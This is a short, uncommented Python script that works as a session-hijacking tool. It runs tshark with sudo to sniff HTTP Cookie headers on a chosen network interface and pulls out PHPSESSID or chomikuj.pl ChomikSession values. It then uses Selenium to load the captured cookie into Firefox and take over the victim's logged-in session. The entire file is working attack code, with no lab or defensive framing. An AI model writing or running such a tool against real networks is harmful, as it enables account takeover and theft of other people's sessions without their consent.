import subprocess as sub
from selenium import webdriver
import sys
def parse(allCookies):
    splitCookies = allCookies.split()

    cookieInfo = {}
    for c in splitCookies:
        if 'PHPSESSID=' in c:
            parsedCookie = c.replace('\"', '').replace(";", '').split('=')
            cookieInfo['key'] = parsedCookie[0]
            cookieInfo['value'] = parsedCookie[1]
            cookieInfo['site'] = 'http://mpietrek.pl'
        if 'ChomikSession=' in c:
            parsedCookie = c.replace('\"', '').replace(";", '').split('=')
            cookieInfo['key'] = parsedCookie[0]
            cookieInfo['value'] = parsedCookie[1]
            cookieInfo['site'] = 'http://chomikuj.pl'
    return cookieInfo


cmd = ['sudo', 'tshark', '-i', sys.argv[1], '-l', '-Y', 'http.request', '-T', 'fields', '-e', 'http.cookie']
p1 = sub.Popen(cmd, stdout=sub.PIPE, stderr=sub.DEVNULL)
cookie = {'path': '/'}

while True:
    output = p1.stdout.readline().decode('utf-8')

    if output:
        cookieInfo = parse(output)
        if not cookieInfo:
            continue
        print(cookieInfo)
        cookie['name'] = cookieInfo['key']
        cookie['value'] = cookieInfo['value']
        if cookieInfo['site'] == 'http://chomikuj.pl':
            cookie['domain'] = '.chomikuj.pl'
        break
    elif output == '' and p1.poll() is not None:
        break

driver = webdriver.Firefox()
driver.get(cookieInfo['site'])
driver.add_cookie(cookie)
driver.refresh()



